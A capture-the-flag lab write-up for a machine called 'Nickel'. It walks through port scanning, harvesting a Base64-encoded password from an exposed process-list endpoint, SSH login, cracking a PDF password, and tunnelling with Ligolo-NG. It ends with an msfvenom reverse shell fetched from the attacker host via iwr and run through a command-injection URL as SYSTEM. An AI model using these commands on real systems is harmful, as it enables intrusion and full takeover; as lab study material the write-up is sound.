# Nickel

## Enumeration & scanning

- Notable open ports are 21, 22, 445, 8089, 33333.
- Port 8089 is HTTP and shows a DevOps Dashboard with links to some other endpoint using port 33333, albeit on a link-local IP.
- Other ports don't show anything of interest; need credentials and port 33333 returns nothing.

``` sh
# Default scanning
sudo nmap -p- 192.168.163.99
sudo nmap -p 21,22,135,139,445,3389,5040,7680,8089,33333 -A 192.168.163.99   
feroxbuster -u http://192.168.163.99:8089
feroxbuster -u http://192.168.163.99:33333

# Dashboard links
http://169.254.164.29:33333/list-current-deployments
http://169.254.164.29:33333/list-running-procs
http://169.254.164.29:33333/list-active-nodes
```

## Exploitation

- We can replace the link-local IPs with the target IP and get back 'Cannot GET', indicating we might need to use POST.
- We do a POST request with BURP (have to add `Content-Length: 0` to make it work) and get back output for the `list-active-nodes` endpoint.
- This gives us a running process list. We see various script being executed, among the following containing a password:
    - `cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh`
    - After decoding with Base64, we get the credential `ariah:NowiseSloopTheory139`.
- We can login with SSH and get local flag

``` sh
# Replace link
http://192.168.163.99:33333/list-active-nodes
# Do POST request using Burp
# Get process list

# Login with SSH
ssh ariah@192.168.163.99
# Get local flag
type local.txt
a9690eb49e9b3dcf77608124468ae8ff
```

## Privilege Escalation

- We find an `FTP` folder in root containing the file `infrastructure.pdf`. To easily grab file, we leverage FTP since the credentials work for that service as well.
- The PDF is password protected. We can crack it using JohnTheRipper.
- We decrypt the PDF and learn some additional endpoint information. This indicates there is another service running on the system on port 80 which we didn't see yet. The process list also confirms this:
    - `powershell.exe -nop -ep bypass C:\windows\system32\ws80.ps1`
- We check out the PowerShell script and it indicates some command execution possibilities, just like the PDF does.
- We could use `curl` to talk to the webserver, but tunneling is cooler. We apply `Ligolo-NG`. We need to create a special route to get `localhost` routing.
- We can then execute commands via the browser endpoint. These are executed as SYSTEM, meaning we can setup a shell and become Administrator to get the flag.

``` sh
# Grab PDF
ftp 192.168.163.99
get infrastructure.pdf

# Crack PDF password
pdf2john infrastructure.pdf > pdf_hash.txt    
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
# Password is 'ariah4168'

# Setup Ligolo-NG
# Setup tunnel interface (if not done yet)
interface_create --name "ligolo"
sudo ip link set ligolo up
# Start proxy
sudo ./proxy -selfcert
# Download and start agent on target
iwr -uri http://192.168.45.152/agent.exe -UseBasicParsing -Outfile agent.exe
.\agent.exe --connect 192.168.45.152:11601 -ignore-cert
# Establish tunnel by adding route
session
ifconfig
interface_add_route --name ligolo --route FROM_IFCONFIG  
start
# However, now we can't yet get to the target localhost:80
# Make use of special route
interface_add_route --name ligolo --route 240.0.0.1/32 
route_list
curl 240.0.0.1 

# Can execute commands through PowerShell script as root!
http://240.0.0.1/?whoami
nt authority\system
# Get shell
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.45.152 LPORT=4444 -f exe -o shell.exe
python3 -m http.server 80
http://240.0.0.1/?iwr -uri http://192.168.45.152/shell.exe -Outfile shell.exe
nc -nvlp 4444
http://240.0.0.1/?shell.exe
# Get flag
type proof.txt
e159a99f36a4f217c9224cbfd6744b75

```

## References

- https://www.tejasl.com/blog/2026/03/03/ligolo-ng-cheatsheet/

## Rabbit holes

- Needed first hint that indicated it's about the POST requests. Actually already thought about this but didn't get it to work because of lack of trying all options.
